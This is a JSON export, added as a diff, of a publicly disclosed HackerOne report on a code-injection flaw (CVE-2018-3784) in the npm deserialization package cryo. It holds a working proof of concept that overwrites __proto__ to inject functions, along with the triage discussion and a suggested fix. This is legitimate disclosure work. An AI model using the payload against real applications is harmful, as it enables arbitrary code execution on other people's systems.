@@ -1,0 +1,564 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-06-19T15:51:36.911Z", 
+    "voters": [
+        "bl4de", 
+        "eveeez", 
+        "oddfuturex", 
+        "apapedulimu", 
+        "cryptographer", 
+        "yassine_ka"
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 350418, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-06-15T21:45:16.937Z", 
+    "vulnerability_information": "I would like to report code injection in serialization package cryo\nIt allows execute arbitrary code using custom prototype.\n\n# Module\n\n**module name:** cryo\n**version:** 0.0.6\n**npm page:** `https://www.npmjs.com/package/cryo`\n\n## Module Description\n\nJSON on steroids.\nBuilt for node.js and browsers. Cryo is inspired by Python's pickle and works similarly to JSON.stringify() and JSON.parse(). Cryo.stringify() and Cryo.parse() improve on JSON in these circumstances:\n\n## Module Stats\n\n37 downloads in the last week\n\n# Vulnerability\n\n## Vulnerability Description\n\nIf an application uses \"cryo\" package to deserialize JSON into an object and interacts with the object later in the code (convert to sting, for example) and if an attacker controls this JSON, then the attacker can get arbitrary code execution in the application.\n\nTo reconstruct an object from JSON, cryo uses square bracket notation ( `obj[key]=value` ). So there is an opportunity for an attacker to change `__proto__` property for a new object. Also Cryo supports serialization of functions, so the attacker can set their own methods (toString, valueOf) for the new object.\nIt means that if later in the code the application interacts with the new object in the way which leads to invocation of the object's prototype functions, then the attacker malicious code are executed.\n\n\n## Steps To Reproduce:\n\nPoC:\n```\nvar Cryo = require('cryo');\nvar frozen = '{\"root\":\"_CRYO_REF_3\",\"references\":[{\"contents\":{},\"value\":\"_CRYO_FUNCTION_function () {console.log(\\\\\"defconrussia\\\\\"); return 1111;}\"},{\"contents\":{},\"value\":\"_CRYO_FUNCTION_function () {console.log(\\\\\"defconrussia\\\\\");return 2222;}\"},{\"contents\":{\"toString\":\"_CRYO_REF_0\",\"valueOf\":\"_CRYO_REF_1\"},\"value\":\"_CRYO_OBJECT_\"},{\"contents\":{\"__proto__\":\"_CRYO_REF_2\"},\"value\":\"_CRYO_OBJECT_\"}]}'\nvar hydrated = Cryo.parse(frozen);\nconsole.log(hydrated);\n```\nconsole.log internally calls hydrated's vauleOf method, so an attacker's code are executed and we can see \"defconrussia\" in console.\n\n## Patch\n\nI suggest to blacklist \"__proto__\" property in deserialization process.\n\n## Supporting Material/References:\n\n- Ubuntu 16.04\n- node v6.11.3\n- npm 5.5.1\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n\n> Hunter's comments and funny memes goes here\nAlso I found a couple of other modules (for example, https://www.npmjs.com/package/kaiser)  which use square bracket notation too, so it's possible to rewrite `__proto__` with them too. But us they don't support serialization of functions, we cannot use the same attack as described here. Still we can set wrong values for prototype's methods, so if an application tries to convert a new object (deserialized from JSON) to string, it may crash with a TypeError exception.\nIt could be a kind of DoS.  What do you think if I should create similar reports for such cases?\n\n## Impact\n\nAn attacker can craft a special JSON file with malicious code which rewrites `__proto__` of a new object. In some circumstances it may lead to execution of the code, so the attacker can achieve OS command execution.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "high", 
+            "privileges_required": "none", 
+            "user_interaction": "none", 
+            "attack_vector": "network", 
+            "attack_complexity": "high", 
+            "scope": "changed", 
+            "integrity": "none", 
+            "availability": "high"
+        }, 
+        "rating": "high", 
+        "score": 8.7, 
+        "author_type": "Team"
+    }, 
+    "title": "Insecure implementation of deserialization in cryo", 
+    "is_member_of_team?": null, 
+    "vote_count": 6, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "cryo", 
+        "max_severity": "critical", 
+        "databaseId": 10261, 
+        "asset_type": "SOURCE_CODE"
+    }, 
+    "allow_singular_disclosure_at": "2018-07-15T21:45:17.031Z", 
+    "state": "Closed", 
+    "cve_ids": [
+        "CVE-2018-3784"
+    ], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-20T08:31:50.546Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-20T08:31:50.546Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Hi\u00a0@greendog,  \n\nThanks a lot for reporting the vulnerability.\nI invited the maintainers team to join the conversation and triage the issue.\n\n", 
+            "markdown_message": "<p>Hi\u00a0@greendog,  </p>\n\n<p>Thanks a lot for reporting the vulnerability.<br>\nI invited the maintainers team to join the conversation and triage the issue.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2767381, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-20T08:31:55.646Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-20T08:31:55.646Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugTriaged", 
+            "id": 2767394, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-20T08:37:34.143Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-20T08:37:34.143Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "High (8.7)", 
+                "old_severity": "Medium"
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 2767712, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-31T19:29:21.102Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-31T19:29:21.102Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "@greendog I haven't been able to reproduce the result from the POC you provided. I just get a log output for an empty object.", 
+            "markdown_message": "<p><a href=\"/greendog\">@greendog</a> I haven&#39;t been able to reproduce the result from the POC you provided. I just get a log output for an empty object.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2825319, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-31T19:31:36.740Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-31T19:31:36.740Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Nevermind, that's actually reproduced in earlier Node.js versions up until 8.9.4", 
+            "markdown_message": "<p>Nevermind, that&#39;s actually reproduced in earlier Node.js versions up until 8.9.4</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2825335, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "old_scope": "Other module", 
+            "created_at": "2018-05-31T19:32:30.618Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-31T19:32:30.618Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "new_scope": "cryo", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ChangedScope", 
+            "id": 2825359, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-31T19:58:40.467Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-31T19:58:40.467Z", 
+            "actor": {
+                "username": "greendog", 
+                "url": "/greendog", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/813/3ff7449951b9f2182785df157e59bfdc0bb9ee30_medium.jpg?1411072576"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "@lirantal Do you know what has changed in the newer version? May be `__proto__` is not supported anymore?\nI need to check it.", 
+            "markdown_message": "<p><a href=\"/lirantal\">@lirantal</a> Do you know what has changed in the newer version? May be <code>__proto__</code> is not supported anymore?<br>\nI need to check it.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2825711, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-31T20:01:02.985Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-31T20:01:02.985Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "I believe there was a similar issue related to __proto__ handling indeed but not sure it's affecting this or not. Let me know what you come up with. ", 
+            "markdown_message": "<p>I believe there was a similar issue related to <strong>proto</strong> handling indeed but not sure it&#39;s affecting this or not. Let me know what you come up with. </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2825718, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-06T11:12:45.479Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-06T11:12:45.479Z", 
+            "actor": {
+                "username": "greendog", 
+                "url": "/greendog", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/813/3ff7449951b9f2182785df157e59bfdc0bb9ee30_medium.jpg?1411072576"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "I've checked it. Actually, deserialization works in the same way in newer versions. `__proto__` is supported and accessible and it is changed after deserialization. The only difference is that `console.log(hydrated);` doesn't call `valueOf()` internally. But if there is a concatenation or something similar, then `valueOf()` is called and our code is executed. For example, `console.log(hydrated + \" - anything\");`", 
+            "markdown_message": "<p>I&#39;ve checked it. Actually, deserialization works in the same way in newer versions. <code>__proto__</code> is supported and accessible and it is changed after deserialization. The only difference is that <code>console.log(hydrated);</code> doesn&#39;t call <code>valueOf()</code> internally. But if there is a concatenation or something similar, then <code>valueOf()</code> is called and our code is executed. For example, <code>console.log(hydrated + &quot; - anything&quot;);</code></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2849366, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-06T11:28:52.445Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-06T11:28:52.445Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "ahh interesting.\nI opened an issue in the repo to see if we can get attention from maintainers to join the discussion. Otherwise I'll go proceed with a public disclosure.", 
+            "markdown_message": "<p>ahh interesting.<br>\nI opened an issue in the repo to see if we can get attention from maintainers to join the discussion. Otherwise I&#39;ll go proceed with a public disclosure.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2849396, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-06T11:37:15.367Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-06T11:37:15.367Z", 
+            "actor": {
+                "username": "greendog", 
+                "url": "/greendog", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/813/3ff7449951b9f2182785df157e59bfdc0bb9ee30_medium.jpg?1411072576"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Ok!\nAnd what about other modules which use square bracket notation too (look at \"Hunter's comments\" paragraph)? Do you think it's a security issue? Because I'm not sure if there is impact or not ", 
+            "markdown_message": "<p>Ok!<br>\nAnd what about other modules which use square bracket notation too (look at &quot;Hunter&#39;s comments&quot; paragraph)? Do you think it&#39;s a security issue? Because I&#39;m not sure if there is impact or not </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2849400, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-06T11:44:30.779Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-06T11:44:30.779Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "We might end up with a lot of modules like that and it would probably fall under a category of bad coding practices than pure security so I'm not sure I'd hunt these stuff at the moment.", 
+            "markdown_message": "<p>We might end up with a lot of modules like that and it would probably fall under a category of bad coding practices than pure security so I&#39;m not sure I&#39;d hunt these stuff at the moment.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2849416, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-06T11:47:14.510Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-06T11:47:14.510Z", 
+            "actor": {
+                "username": "greendog", 
+                "url": "/greendog", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/813/3ff7449951b9f2182785df157e59bfdc0bb9ee30_medium.jpg?1411072576"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "I fully agree. Btw, i'm going to write an article about that, to give more attention to `__proto__`-stuff.", 
+            "markdown_message": "<p>I fully agree. Btw, i&#39;m going to write an article about that, to give more attention to <code>__proto__</code>-stuff.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2849425, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-06T11:48:18.601Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-06T11:48:18.601Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Sounds great!\nPing me when you do and I'll do my best to share it in social media and promote awareness.", 
+            "markdown_message": "<p>Sounds great!<br>\nPing me when you do and I&#39;ll do my best to share it in social media and promote awareness.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2849476, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "greendog", 
+                "url": "/greendog"
+            }, 
+            "created_at": "2018-06-15T21:44:45.091Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-15T21:44:45.091Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Will go ahead with publishing the report due to no activity from the maintainers", 
+            "markdown_message": "<p>Will go ahead with publishing the report due to no activity from the maintainers</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 2891752, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-15T21:45:16.969Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-15T21:45:16.969Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2891755, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-19T15:50:21.047Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-19T15:50:21.047Z", 
+            "actor": {
+                "username": "greendog", 
+                "url": "/greendog", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/813/3ff7449951b9f2182785df157e59bfdc0bb9ee30_medium.jpg?1411072576"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "@lirantal Ok! And here is the article https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/", 
+            "markdown_message": "<p><a href=\"/lirantal\">@lirantal</a> Ok! And here is the article <a title=\"https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/\" href=\"/redirect?signature=67ce05113efc79f428928f7e54c626823e6843e6&amp;url=https%3A%2F%2Fwww.acunetix.com%2Fblog%2Fweb-security-zone%2Fdeserialization-vulnerabilities-attacking-deserialization-in-js%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2907823, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-19T15:51:36.946Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-19T15:51:36.946Z", 
+            "actor": {
+                "username": "greendog", 
+                "url": "/greendog", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/813/3ff7449951b9f2182785df157e59bfdc0bb9ee30_medium.jpg?1411072576"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2907825, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-19T15:51:37.052Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-19T15:51:37.052Z", 
+            "actor": {
+                "username": "greendog", 
+                "url": "/greendog", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/813/3ff7449951b9f2182785df157e59bfdc0bb9ee30_medium.jpg?1411072576"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 2907826, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "greendog", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/greendog", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/007/813/52acb8175dcdfacf3c6eff709ba568c30f5c62ff_small.jpg?1411072576"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 70, 
+        "name": "Code Injection"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -12443663.357913898, 
+    "disclosed_at": "2018-06-19T15:51:37.020Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/350418", 
+    "created_at": "2018-05-11T12:05:58.528Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>I would like to report code injection in serialization package cryo<br>\nIt allows execute arbitrary code using custom prototype.</p>\n\n<h1 id=\"module\">Module</h1>\n\n<p><strong>module name:</strong> cryo<br>\n<strong>version:</strong> 0.0.6<br>\n<strong>npm page:</strong> <code>https://www.npmjs.com/package/cryo</code></p>\n\n<h2 id=\"module-description\">Module Description</h2>\n\n<p>JSON on steroids.<br>\nBuilt for node.js and browsers. Cryo is inspired by Python&#39;s pickle and works similarly to JSON.stringify() and JSON.parse(). Cryo.stringify() and Cryo.parse() improve on JSON in these circumstances:</p>\n\n<h2 id=\"module-stats\">Module Stats</h2>\n\n<p>37 downloads in the last week</p>\n\n<h1 id=\"vulnerability\">Vulnerability</h1>\n\n<h2 id=\"vulnerability-description\">Vulnerability Description</h2>\n\n<p>If an application uses &quot;cryo&quot; package to deserialize JSON into an object and interacts with the object later in the code (convert to sting, for example) and if an attacker controls this JSON, then the attacker can get arbitrary code execution in the application.</p>\n\n<p>To reconstruct an object from JSON, cryo uses square bracket notation ( <code>obj[key]=value</code> ). So there is an opportunity for an attacker to change <code>__proto__</code> property for a new object. Also Cryo supports serialization of functions, so the attacker can set their own methods (toString, valueOf) for the new object.<br>\nIt means that if later in the code the application interacts with the new object in the way which leads to invocation of the object&#39;s prototype functions, then the attacker malicious code are executed.</p>\n\n<h2 id=\"steps-to-reproduce\">Steps To Reproduce:</h2>\n\n<p>PoC:</p>\n<pre class=\"highlight plaintext\"><code>var Cryo = require(&#39;cryo&#39;);\nvar frozen = &#39;{&quot;root&quot;:&quot;_CRYO_REF_3&quot;,&quot;references&quot;:[{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function () {console.log(\\\\&quot;defconrussia\\\\&quot;); return 1111;}&quot;},{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function () {console.log(\\\\&quot;defconrussia\\\\&quot;);return 2222;}&quot;},{&quot;contents&quot;:{&quot;toString&quot;:&quot;_CRYO_REF_0&quot;,&quot;valueOf&quot;:&quot;_CRYO_REF_1&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT_&quot;},{&quot;contents&quot;:{&quot;__proto__&quot;:&quot;_CRYO_REF_2&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT_&quot;}]}&#39;\nvar hydrated = Cryo.parse(frozen);\nconsole.log(hydrated);\n</code></pre>\n<p>console.log internally calls hydrated&#39;s vauleOf method, so an attacker&#39;s code are executed and we can see &quot;defconrussia&quot; in console.</p>\n\n<h2 id=\"patch\">Patch</h2>\n\n<p>I suggest to blacklist &quot;<strong>proto</strong>&quot; property in deserialization process.</p>\n\n<h2 id=\"supporting-material-references\">Supporting Material/References:</h2>\n\n<ul>\n<li>Ubuntu 16.04</li>\n<li>node v6.11.3</li>\n<li>npm 5.5.1</li>\n</ul>\n\n<h1 id=\"wrap-up\">Wrap up</h1>\n\n<ul>\n<li>I contacted the maintainer to let them know: N</li>\n<li>I opened an issue in the related repository: N</li>\n</ul>\n\n<blockquote>\n<p>Hunter&#39;s comments and funny memes goes here<br>\nAlso I found a couple of other modules (for example, <a title=\"https://www.npmjs.com/package/kaiser\" href=\"/redirect?signature=ae27227d8883e252439a420365fe0f26f12254eb&amp;url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fkaiser\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.npmjs.com/package/kaiser</span><i class=\"icon-external-link\"></i></a>)  which use square bracket notation too, so it&#39;s possible to rewrite <code>__proto__</code> with them too. But us they don&#39;t support serialization of functions, we cannot use the same attack as described here. Still we can set wrong values for prototype&#39;s methods, so if an application tries to convert a new object (deserialized from JSON) to string, it may crash with a TypeError exception.<br>\nIt could be a kind of DoS.  What do you think if I should create similar reports for such cases?</p>\n</blockquote>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>An attacker can craft a special JSON file with malicious code which rewrites <code>__proto__</code> of a new object. In some circumstances it may lead to execution of the code, so the attacker can achieve OS command execution.</p>\n", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://nodejs.org/en/security/", 
+            "about": "This program is used to handle vulnerabilities in the Node.js ecosystem.", 
+            "twitter_handle": "", 
+            "name": "Node.js third-party modules"
+        }, 
+        "handle": "nodejs-ecosystem", 
+        "url": "https://hackerone.com/nodejs-ecosystem", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/023/949/309112251b444244d95977d1299148aae6482789_small.?1508679627", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/023/949/c1f5f15ac094c1327c13dd19f55dbcb7411272bd_medium.?1508679627"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 23949, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
